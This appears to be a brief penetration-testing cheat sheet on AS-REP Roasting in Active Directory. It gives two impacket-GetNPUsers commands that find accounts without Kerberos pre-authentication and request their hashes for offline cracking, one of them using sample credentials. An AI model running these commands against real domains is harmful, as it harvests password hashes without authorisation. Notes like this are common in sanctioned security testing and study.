# AS-REP Roasting
Getting TGTs. Need 'DONT_REQUIRE_PREAUTH' set.
Users from file: `impacket-GetNPUsers 'DOMAIN/' -usersfile USERLIST -no-pass -dc-ip IP`
All from domain: `impacket-GetNPUsers 'DOMAIN/triceratops:Sh4rpH0rns' -request -outputfile HASH`